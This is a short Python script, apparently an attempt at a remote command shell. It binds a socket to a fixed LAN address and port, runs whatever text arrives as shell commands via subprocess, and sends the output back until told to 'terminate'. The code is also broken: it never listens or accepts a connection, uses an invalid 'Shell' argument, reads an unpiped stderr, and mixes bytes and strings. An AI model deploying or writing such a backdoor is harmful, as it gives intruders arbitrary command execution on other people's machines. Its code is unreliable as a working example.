import socket
import subprocess

def conecction():
    sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sok.bind(("192.168.81.14" , 8090))

    while True:
        command = sok.recv(1024)

        if "terminate" in command:
            sok.close()
            break
        else:
            cmd = subprocess.Popen(command, Shell=True , stdout= subprocess.PIPE, stdin=None)
            sok.send(cmd.stdout.read())
            sok.send(cmd.stderr.read())

def main():
    conecction()

main()
